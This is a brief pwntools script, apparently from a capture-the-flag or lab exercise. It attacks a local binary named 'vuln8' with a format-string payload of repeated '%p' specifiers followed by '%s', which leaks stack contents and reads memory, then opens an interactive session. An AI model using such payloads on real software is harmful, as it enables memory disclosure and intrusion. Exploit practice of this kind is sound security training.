from pwn import * 

a = process('./vuln8')

buf = ' %p'*0x24 + ' %s'
a.recvuntil('input whatever string you want; then it will be printed back:\n')
a.sendline(buf) 
a.interactive()